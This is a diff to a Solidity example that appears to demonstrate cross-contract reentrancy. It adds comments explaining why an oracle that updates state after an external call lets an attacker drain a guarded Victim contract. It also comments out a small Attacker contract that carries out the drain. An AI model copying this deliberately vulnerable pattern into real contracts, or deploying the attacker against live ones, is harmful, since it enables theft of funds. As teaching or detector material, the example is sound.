@@ -5,15 +5,13 @@ interface IStrategy {
     function execute() external;
 }
 
-// CONTROL FLOW: A.execute() -> LOOP { V.withdraw() -> A.receive() -> O.work() -> A.execute() -> V.withdraw() ... }
-
 
 contract Victim {
-    Oracle public o;
+    Oracle_ree public o;
     bool private flag = false;
 
     constructor(address _o) {
-        o = Oracle(_o);
+        o = Oracle_ree(_o);
     }
 
     modifier nonReentrant() {
@@ -23,7 +21,7 @@ contract Victim {
         flag = false;
     }
 
-    function withdraw() nonReentrant external returns (uint256) {
+    function withdraw() nonReentrant external returns (uint256) { // even if the victim correctly implements the reentracy guard, the attack still succeed
         uint256 rate = o.totalETHView() * 1e18 / o.totalSupplyView();
         uint256 amountETH = rate * 1000 / 1e18;
 
@@ -37,15 +35,15 @@ contract Victim {
     receive() external payable {}
 }
 
-// this is the VULNERABLE CONTRACT
-contract Oracle {
+// THIS is the contract vulnerable to reentrancy
+contract Oracle_ree {
     uint256 public totalETH;
     uint256 public totalSupply;
 
     function work(address strategy) external payable {
         totalETH += msg.value;
         IStrategy(strategy).execute();
-        totalSupply += msg.value;
+        totalSupply += msg.value;  // side-effect AFTER external call makes this contract unsafe, even if the money theft is performed on Victim, not this contract
     }
 
     function totalETHView() external view returns (uint256) {
@@ -55,21 +53,22 @@ contract Oracle {
         return totalSupply;
     }
 }
+// CONTROL FLOW: A.execute() -> LOOP { V.withdraw() -> A.receive() -> O.work() -> A.execute() -> V.withdraw() ... }
 
-contract Attacker is IStrategy {
-    Victim public v;
-    Oracle public o;
+// contract Attacker is IStrategy {
+//     Victim public v;
+//     Oracle_ree public o;
 
-    constructor(address payable _v, address _o) {
-        v = Victim(_v);
-        o = Oracle(_o);
-    }
+//     constructor(address payable _v, address _o) {
+//         v = Victim(_v);
+//         o = Oracle_ree(_o);
+//     }
 
-    function execute() external {
-        v.withdraw();
-    }
+//     function execute() external {
+//         v.withdraw();
+//     }
 
-    receive() external payable {
-        o.work(address(this));
-    }
-}
+//     receive() external payable {
+//         o.work(address(this));
+//     }
+// }
